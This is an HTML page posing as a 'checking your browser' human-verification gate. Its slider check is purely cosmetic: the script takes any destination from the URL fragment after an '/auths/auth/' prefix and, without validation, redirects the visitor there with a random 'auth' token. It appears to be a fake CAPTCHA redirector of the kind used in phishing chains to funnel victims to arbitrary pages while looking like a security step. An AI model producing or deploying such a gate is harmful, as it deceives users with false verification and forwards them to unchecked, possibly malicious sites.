<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checking your browser...</title>

<style>
body{
  font-family:sans-serif;
  background:#f6f7f9;
  text-align:center;
  margin-top:80px;
}
.box{
  background:white;
  padding:30px;
  border-radius:10px;
  display:inline-block;
  box-shadow:0 0 15px rgba(0,0,0,0.1);
}
</style>
</head>
<body>

<div class="box">
<h2>Checking your browser before accessing...</h2>
<p id="status">Slide to verify you are human.</p>

<input type="range" id="slider" min="0" max="100" value="0">
<br><br>
<button onclick="verify()">Verify</button>
</div>

<script>
// Extract redirect from URL
function getRedirect() {
  let hash = window.location.hash.substring(1);
  if(!hash) return null;

  // remove /auths/auth/
  hash = hash.replace("/auths/auth/","");
  return decodeURIComponent(hash);
}

function generateToken(len=12){
  const chars="abcdefghijklmnopqrstuvwxyz0123456789";
  let t="";
  for(let i=0;i<len;i++)
    t+=chars[Math.floor(Math.random()*chars.length)];
  return t;
}

function verify(){
  const slider=document.getElementById("slider");

  if(slider.value < 95){
    alert("Please slide fully to verify.");
    return;
  }

  const redirect=getRedirect();

  if(!redirect){
    document.getElementById("status").innerText="No redirect URL.";
    return;
  }

  document.getElementById("status").innerText="Verification successful. Redirecting...";

  const token=generateToken();

  setTimeout(()=>{
    window.location.href =
      redirect + "?auth=" + token;
  },1200);
}
</script>

</body>
</html>
